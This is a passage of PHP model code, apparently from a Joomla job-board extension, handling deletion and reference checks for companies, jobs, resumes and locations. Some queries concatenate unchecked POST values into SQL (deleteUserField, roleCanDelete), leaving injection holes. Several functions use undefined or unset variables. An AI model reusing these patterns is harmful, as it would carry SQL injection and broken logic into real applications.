        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('userfield');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->userFieldCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                } else {
                    $db = $this->getDbo();
                    $query = "DELETE fieldvalues FROM `#__js_job_userfieldvalues` AS fieldvalues WHERE fieldvalues.field = " . $cid;
                    $db->setQuery($query);
                    $db->query();
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteCountry() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('country');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->countryCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteState() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('state');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->stateCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteCounty() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('county');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->countyCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function deleteCity() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('city');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->cityCanDelete($cid) == true) {
                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function companyCanDelete($companyid) {
        if (is_numeric($companyid) == false)
            return false;
        $db = &$this->getDBO();

		$query = "SELECT 
					( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE companyid = " . $companyid . ") 
					+ ( SELECT COUNT(id) FROM `#__js_job_departments` WHERE companyid = " . $companyid . ")
					+ ( SELECT COUNT(id) FROM `#__js_job_companies` AS fc WHERE fc.isfeaturedcompany=1 AND fc.id = " . $companyid . ") 
					+ ( SELECT COUNT(id) FROM `#__js_job_companies` AS gc WHERE gc.isgoldcompany=1 AND gc.id = " . $companyid . ")
					AS total ";
		$db->setQuery($query);
		$total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function companyEnforceDelete($companyid, $uid) {
        if (is_numeric($companyid) == false)
            return false;
        $db = &$this->getDBO();
		$servercompanyid=0;
		if ($this->_client_auth_key != "") {
			$query = "SELECT company.serverid AS serverid FROM `#__js_job_companies` AS company  WHERE company.id = " . $companyid;
			$db->setQuery($query);
			$c_s_id = $db->loadResult();
			if ($c_s_id) $servercompanyid = $c_s_id;
		}
        $query = "DELETE  company,job,department,companycity,userfielddata
						 FROM `#__js_job_companies` AS company
						 LEFT JOIN `#__js_job_companycities` AS companycity ON company.id=companycity.companyid
						 LEFT JOIN `#__js_job_jobs` AS job ON company.id=job.companyid
						 LEFT JOIN `#__js_job_departments` AS department ON company.id=department.companyid
						 LEFT JOIN `#__js_job_userfield_data` AS userfielddata ON company.id=userfielddata.referenceid
						 WHERE company.id = " . $companyid;
        //echo '<br> SQL '.$query;
        $db->setQuery($query);
        if (!$db->query()) {
            return 2; //error while delete company
        }
		$this->deleteUserFieldData($companyid);
		if ($servercompanyid != 0) {
			$data = array();
			$data['id'] = $servercompanyid;
			$data['referenceid'] = $cid;
			$data['uid'] = $this->_uid;
			$data['authkey'] = $this->_client_auth_key;
			$data['siteurl'] = $this->_siteurl;
			$data['task'] = 'deletecompany';
			$data['enforcedeletecompany'] = 1;
			$jsjobsharingobject = new JSJobsModelJobSharing;
			$return_value = $jsjobsharingobject->deleteCompanySharing($data);
			return $return_value;
		}
        return 1;
    }

    function folderEnforceDelete($folderid, $uid) {
        if (is_numeric($folderid) == false)
            return false;
        $db = &$this->getDBO();
        $query = "DELETE  folder
                                 FROM `#__js_job_folders` AS folder
                                 WHERE folder.id = " . $folderid;

        $db->setQuery($query);
        if (!$db->query()) {
            return 2; //error while delete folder
        }
        return 1;
    }

    function jobCanDelete($jobid) {
        if (is_numeric($jobid) == false)
            return false;
        $db = &$this->getDBO();


		$query = "SELECT
								( SELECT COUNT(id) FROM `#__js_job_jobapply` WHERE jobid = " . $jobid . ")
								+ ( SELECT COUNT(id) FROM `#__js_job_jobs` AS fj WHERE fj.isfeaturedjob=1 AND fj.id = " . $jobid . ")
								+ ( SELECT COUNT(id) FROM `#__js_job_jobs` AS gj WHERE gj.isgoldjob=1 AND gj.id = " . $jobid . ")
								AS total ";
		$db->setQuery($query);
		$total = $db->loadResult();
        if ($total > 0)
            return false;
        else
            return true;
    }

    function jobEnforceDelete($jobid, $uid) {
        if ($uid)
            if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))  return false;
        if (is_numeric($jobid) == false)       return false;
		$serverjodid = 0;
		if ($this->_client_auth_key != "") {
			$query = "SELECT job.serverid AS id FROM `#__js_job_jobs` AS job WHERE job.id = " . $jobid;
			$db->setQuery($query);
			$s_job_id = $db->loadResult();
			$serverjodid = $s_job_id;
		}
        
        $db = &$this->getDBO();
        $query = "DELETE  job,apply,jobcity
					 FROM `#__js_job_jobs` AS job
					 LEFT JOIN `#__js_job_jobapply` AS apply ON job.id=apply.jobid
					 LEFT JOIN `#__js_job_jobcities` AS jobcity ON job.id=jobcity.jobid
					 WHERE job.id = " . $jobid;

        $db->setQuery($query);
        if (!$db->query()) {
            return 2; //error while delete job
        }
		$this->deleteUserFieldData($jobid);
		if ($serverjodid != 0) {
			$data = array();
			$data['id'] = $serverjodid;
			$data['referenceid'] = $jobid;
			$data['uid'] = $this->_uid;
			$data['authkey'] = $this->_client_auth_key;
			$data['siteurl'] = $this->_siteurl;
			$data['enforcedeletejob'] = 1;
			$data['task'] = 'deletejob';
			$jsjobsharingobject = new JSJobsModelJobSharing;
			$return_value = $jsjobsharingobject->deleteJobSharing($data);
			return $return_value;
		}
        return 1;
    }

    function resumeCanDelete($resumeid) {
        if (is_numeric($resumeid) == false)
            return false;
        $db = &$this->getDBO();
        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobapply` WHERE cvid = " . $resumeid . ")
                    AS total ";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function resumeEnforceDelete($resumeid, $uid) {
        if ($uid)
            if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
                return false;
        if (is_numeric($resumeid) == false)
            return false;
        $db = &$this->getDBO();
		$juid = 0; // jobseeker uid
		$serverresumeid = 0;
		if ($this->_client_auth_key != "") {
			$query = "SELECT resume.serverid AS id,resume.uid AS uid FROM `#__js_job_resume` AS resume WHERE resume.id = " . $resumeid;
			$db->setQuery($query);
			$data = $db->loadObject();
			$serverresumeid = $data->id;
			$juid = $data->uid;
		}
        $query = "DELETE  resume,apply
                    FROM `#__js_job_resume` AS resume
                    LEFT JOIN `#__js_job_jobapply` AS apply ON resume.id=apply.cvid
                    WHERE resume.id = " . $resumeid;

        $db->setQuery($query);
        if (!$db->query()) {
            return 2; //error while delete resume
		}
		$this->deleteUserFieldData($resumeid);
		if ($serverresumeid != 0) {
			$data = array();
			$data['id'] = $serverresumeid;
			$data['referenceid'] = $cid;
			$data['uid'] = $juid;
			$data['authkey'] = $this->_client_auth_key;
			$data['siteurl'] = $this->_siteurl;
			$data['enforcedeleteresume'] = 1;
			$data['task'] = 'deleteresume';
			$jsjobsharingobject = new JSJobsModelJobSharing;
			$return_value = $jsjobsharingobject->deleteResumeSharing($data);
			return $return_value;
		}
        return 1;
    }

    function featuredResumeCanDelete($resumeid) {
        if (is_numeric($resumeid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT COUNT(apply.id) FROM `#__js_job_jobapply` AS apply
					WHERE apply.cvid = " . $resumeid;
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function categoryCanDelete($categoryid) {
        if (is_numeric($categoryid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_companies` WHERE category = " . $categoryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE jobcategory = " . $categoryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE job_category = " . $categoryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_subcategories` WHERE categoryid = " . $categoryid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function subCategoryCanDelete($categoryid) {
        if (is_numeric($categoryid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_companies` WHERE category = " . $categoryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE jobcategory = " . $categoryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE job_category = " . $categoryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_subcategories` WHERE categoryid = " . $categoryid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function jobTypeCanDelete($typeid) {
        if (is_numeric($typeid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE jobtype = " . $typeid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE jobtype = " . $typeid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function ageCanDelete($ageid) {
        if (is_numeric($ageid) == false)
            return false;
        $db = &$this->getDBO();
        $query = " SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE agefrom = " . $ageid . " OR ageto = " . $ageid . ")					
                    AS total";

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total > 0)
            return false;
        else
            return true;
    }

    function currencyCanDelete($currencyid) {
        if (is_numeric($currencyid) == false)
            return false;
        $db = &$this->getDBO();
        $query = " SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE currencyid = " . $currencyid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE currencyid = " . $currencyid . " OR dcurrencyid = " . $currencyid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_employerpackages` WHERE currencyid = " . $currencyid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_jobseekerpackages` WHERE currencyid = " . $currencyid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total > 0)
            return false;
        else
            return true;
    }

    function careerLevelCanDelete($careerlevelid) {
        if (is_numeric($careerlevelid) == false)
            return false;
        $db = &$this->getDBO();
        $query = " SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE careerlevel = " . $careerlevelid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total > 0)
            return false;
        else
            return true;
    }

    function experienceCanDelete($experienceid) {
        if (is_numeric($experienceid) == false)
            return false;
        $db = &$this->getDBO();
        $query = " SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE experienceid = " . $experienceid . " OR minexperiencerange = " . $experienceid . " OR maxexperiencerange = " . $experienceid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total > 0)
            return false;
        else
            return true;
    }

    function departmentCanDelete($departmentid) {
        if (is_numeric($departmentid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE departmentid = " . $departmentid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function jobStatusCanDelete($statusid) {
        if (is_numeric($statusid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE jobstatus = " . $statusid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function shiftCanDelete($shiftid) {
        if (is_numeric($shiftid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE shift = " . $shiftid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function highestEducationCanDelete($educationid) {
        if (is_numeric($educationid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE heighestfinisheducation = " . $educationid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE heighestfinisheducation = " . $educationid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function salaryRangeCanDelete($salaryid) {
        if (is_numeric($salaryid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE jobsalaryrange = " . $salaryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE jobsalaryrange = " . $salaryid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function salaryRangeTypeCanDelete($id) {
        if (is_numeric($id) == false)
            return false;
        $db = &$this->getDBO();
        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE salaryrangetype = " . $id . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total > 0)
            return false;
        else
            return true;
    }

    function roleCanDelete($roleid) {
        $db = &$this->getDBO();

        $query = "SELECT COUNT(userrole.id) FROM `#__js_job_userroles` AS userrole
					WHERE userrole.role = " . $roleid;

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function userFieldCanDelete($field) {
        $db = &$this->getDBO();

        $query = "SELECT COUNT(id) 	AS total FROM `#__js_job_userfield_data` WHERE field = " . $field;

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function countryCanDelete($countryid) {
        if (is_numeric($countryid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_companies` WHERE country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE nationality = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address1_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address2_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute1_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute2_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute3_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer1_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer2_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer3_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference1_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference2_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference3_country = " . $countryid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_states` WHERE countryid = " . $countryid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function stateCanDelete($stateid) {
        if (is_numeric($stateid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT 
                    ( SELECT COUNT(mcity.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_jobcities` AS mcity ON mcity.cityid=city.id 
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(cmcity.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_companycities` AS cmcity ON cmcity.cityid=city.id 
                            WHERE city.stateid = " . $stateid . "
                    )
                    +
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.address_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    +
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.address1_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    +
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.address2_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.institute_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.institute1_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.institute2_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.institute3_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.employer_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.employer1_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.employer2_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.employer3_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.reference_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.reference1_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.reference2_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    + 
                    ( SELECT COUNT(resume.id) 
                            FROM `#__js_job_cities` AS city
                            JOIN `#__js_job_resume` AS resume ON resume.reference3_city=city.id
                            WHERE city.stateid = " . $stateid . "
                    )
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function countyCanDelete($countyid) {
        if (is_numeric($countyid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT code FROM `#__js_job_counties`	WHERE id = " . $countyid;
        $db->setQuery($query);
        $county = $db->loadObject();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobs` WHERE county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_companies` WHERE county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address1_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address2_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute1_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute2_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute3_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer1_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer2_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer3_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference1_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference2_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference3_county = " . $db->Quote($county->code) . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_cities` WHERE countycode = " . $db->Quote($county->code) . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function cityCanDelete($cityid) {
        if (is_numeric($cityid) == false)
            return false;
        $db = &$this->getDBO();

        $query = "SELECT id FROM `#__js_job_cities`	WHERE id = " . $cityid;
        $db->setQuery($query);
        $city = $db->loadObject();

        $query = "SELECT
                    ( SELECT COUNT(id) FROM `#__js_job_jobcities` WHERE cityid = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_companycities` WHERE cityid = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address1_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE address2_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute1_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute2_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE institute3_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer1_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer2_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE employer3_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference1_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference2_city = " . $cityid . ")
                    + ( SELECT COUNT(id) FROM `#__js_job_resume` WHERE reference3_city = " . $cityid . ")
                    AS total ";

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function deleteJobSeekerPackage() {
        $cids = JRequest :: getVar('cid', array(0), 'post', 'array');
        $row = & $this->getTable('jobseekerpackage');
        $deleteall = 1;
        foreach ($cids as $cid) {
            if ($this->jobseekerPackageCanDelete($cid) == true) {

                if (!$row->delete($cid)) {
                    $this->setError($row->getErrorMsg());
                    return false;
                }
            }
            else
                $deleteall++;
        }
        return $deleteall;
    }

    function jobseekerPackageCanDelete($id) {
        if (is_numeric($id) == false)
            return false;
        $db = &$this->getDBO();
        $query = "SELECT COUNT(id) FROM `#__js_job_paymenthistory` WHERE packageid = " . $id . " AND packagefor=2 ";
        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total > 0)
            return false;
        else
            return true;
    }

    function & getGoldResumes($searchtitle, $searchname, $searchjobseekerpackage, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(goldresumes.id)
		FROM #__js_job_resume AS goldresumes
		LEFT JOIN #__js_job_jobseekerpackages AS package ON package.id=goldresumes.packageid
		WHERE goldresumes.isgoldresume=1 AND goldresumes.status <> 0";

        if ($searchtitle)
            $query .= " AND LOWER(goldresumes.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(goldresumes.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(goldresumes.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(goldresumes.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobseekerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchjobseekerpackage . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;


		$query = "SELECT goldresumes.id,goldresumes.status,goldresumes.application_title,goldresumes.first_name, goldresumes.last_name,
				goldresumes.create_date, package.title AS packagetitle
				FROM #__js_job_resume AS goldresumes 
				LEFT JOIN #__js_job_jobseekerpackages AS package ON package.id=goldresumes.packageid
				WHERE goldresumes.isgoldresume=1 AND goldresumes.status <> 0";


        if ($searchtitle)
            $query .= " AND LOWER(goldresumes.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(goldresumes.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(goldresumes.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(goldresumes.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }

        if ($searchjobseekerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchjobseekerpackage . '%', false);

        $query .= " ORDER BY goldresumes.create_date DESC";


        $db->setQuery($query, $limitstart, $limit);
        $goldresumes = $db->loadObjectList();

        $lists = array();

        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchjobseekerpackage)
            $lists['searchjobseekerpackage'] = $searchjobseekerpackage;


        $result[0] = $goldresumes;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedGoldResume($searchtitle, $searchname, $searchjobseekerpackage, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(goldresumes.id)
		FROM #__js_job_goldresumes AS goldresumes
		LEFT JOIN #__js_job_jobseekerpackages AS package ON package.id=goldresumes.packageid
		WHERE goldresumes.status = 0";

        if ($searchtitle)
            $query .= " AND LOWER(app.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobseekerpackage)
            $query .= " AND LOWER(package.title) LIKE " . $db->Quote('%' . $searchjobseekerpackage . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;


        $query = "SELECT goldresumes.*,app.application_title,app.first_name, app.last_name,
				app.create_date, package.title AS packagetitle
				FROM #__js_job_goldresumes AS goldresumes ,#__js_job_resume AS app, #__js_job_jobseekerpackages AS package
				WHERE app.id=goldresumes.resumeid AND  package.id=goldresumes.packageid AND goldresumes.status = 0";

        if ($searchtitle)
            $query .= " AND LOWER(app.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
